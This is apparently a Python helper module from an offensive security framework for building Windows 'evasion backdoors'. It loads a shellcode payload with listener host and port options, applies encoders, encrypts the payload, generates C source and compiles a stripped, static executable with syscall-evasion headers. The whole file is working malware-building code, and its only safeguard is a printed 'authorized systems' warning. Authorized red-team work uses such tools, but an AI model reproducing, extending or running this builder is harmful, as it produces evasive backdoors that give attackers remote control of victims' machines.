#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Shared helpers for Windows evasion backdoor generators."""

from __future__ import annotations

import importlib
from pathlib import Path
from typing import Any, Optional

from core.output_handler import print_error, print_status, print_success, print_warning
from lib.compile.exe import ExeCompiler


def plain_option(value: Any) -> Any:
    if value is None or isinstance(value, (str, bytes, int, float, bool)):
        return value
    if hasattr(value, "value"):
        return value.value
    return value


def option_value(module: Any, name: str) -> Any:
    descriptor = getattr(type(module), name, None)
    if descriptor is not None and hasattr(descriptor, "__get__"):
        return descriptor.__get__(module, type(module))
    return getattr(module, name, None)


def load_payload_module(module: Any):
    path = str(option_value(module, "payload_path") or "").strip()
    if not path:
        print_error("Set payload_path to a shellcode payload module path.")
        return None

    module_path = path.replace("/", ".").strip(".")
    try:
        payload_cls = getattr(
            importlib.import_module(f"modules.{module_path}"),
            "Module",
        )
    except Exception as exc:
        print_error(f"Failed to import payload module {path}: {exc}")
        return None

    payload_module = payload_cls(framework=getattr(module, "framework", None))
    for name in ("lhost", "lport", "rhost", "rport", "encoder", "transform", "obfuscator"):
        if not hasattr(type(payload_module), name):
            continue
        value = plain_option(option_value(module, name))
        if value in (None, ""):
            continue
        payload_module.set_option(name, value)
    return payload_module


def generate_payload_bytes(module: Any) -> Optional[bytes]:
    payload_module = load_payload_module(module)
    if payload_module is None:
        return None

    try:
        raw_payload = payload_module.generate()
    except Exception as exc:
        print_error(f"Failed to generate payload: {exc}")
        return None

    if not raw_payload:
        print_error("Payload module returned empty data.")
        return None
    if isinstance(raw_payload, str):
        raw_payload = raw_payload.encode("latin-1", errors="ignore")
    if not isinstance(raw_payload, (bytes, bytearray)):
        print_error("Payload module must return raw shellcode bytes.")
        return None

    encoder_path = str(option_value(module, "encoder") or "").strip()
    if encoder_path:
        encoder_path = encoder_path.replace("/", ".").strip(".")
        try:
            encoder_module = getattr(
                importlib.import_module(f"modules.{encoder_path}"),
                "Module",
            )(framework=getattr(module, "framework", None))
            if hasattr(encoder_module, "encode"):
                raw_payload = encoder_module.encode(raw_payload)
        except Exception as exc:
            print_error(f"Failed to apply encoder: {exc}")
            return None

    return bytes(raw_payload)


def compile_c_pe(
    *,
    source: str,
    exe_path: Path,
    headers_dir: str,
    framework=None,
    optimization: str = "ReleaseSmall",
    windows_subsystem: str = "windows",
) -> bool:
    compiler = ExeCompiler(framework=framework)
    zig = compiler._get_zig_compiler()
    return zig.compile_c(
        source_code=source,
        output_path=str(exe_path.resolve()),
        target_platform="windows",
        target_arch="x64",
        optimization=optimization,
        strip=True,
        static=True,
        windows_subsystem=windows_subsystem,
        include_dir=headers_dir,
    )


def prepare_exe_output(module: Any, subdir: str, output_name: str) -> tuple[Path, str]:
    out_dir = Path(module.output_dir_path(subdir))
    out_dir.mkdir(parents=True, exist_ok=True)
    exe_name = str(output_name or "evasion.exe").strip()
    if not exe_name.lower().endswith(".exe"):
        exe_name += ".exe"
    return out_dir, exe_name


def report_payload_size(raw_payload: bytes) -> None:
    print_status(f"Payload size: {len(raw_payload)} bytes")


def build_encrypted_c_backdoor(
    module: Any,
    builder: Any,
    *,
    build_source_kwargs: dict | None = None,
    output_name: str,
    save_source_name: str = "main.c",
    subsystem: str = "windows",
) -> bool:
    """Shared run path: encrypt payload, build C source, compile PE."""
    raw_payload = generate_payload_bytes(module)
    if not raw_payload:
        return False

    report_payload_size(raw_payload)

    encoded, key, iv = builder.encrypt_payload(raw_payload)
    source = builder.build_source(encoded, key, iv, **(build_source_kwargs or {}))

    out_dir, exe_name = prepare_exe_output(
        module,
        "backdoors/windows/evasion",
        str(option_value(module, "output_name") or output_name),
    )
    exe_path = out_dir / exe_name

    if option_value(module, "save_source"):
        src_path = out_dir / save_source_name
        src_path.write_text(source, encoding="utf-8")
        print_success(f"C source saved: {src_path}")

    from lib.compile.syscall_evasion import SyscallEvasionBuilder

    ok = compile_c_pe(
        source=source,
        exe_path=exe_path,
        headers_dir=str(SyscallEvasionBuilder.headers_directory()),
        framework=getattr(module, "framework", None),
        optimization=str(option_value(module, "optimization") or "ReleaseSmall"),
        windows_subsystem=str(option_value(module, "windows_subsystem") or subsystem),
    )

    if ok and exe_path.is_file():
        size = exe_path.stat().st_size
        print_success(f"Backdoor executable generated: {exe_path} ({size} bytes)")
        print_warning("Use only on authorized systems. Start a matching listener before running the EXE.")
        return True

    print_error("PE compilation failed. Ensure Zig is installed (core/lib/compiler/zig_executable or PATH).")
    return False
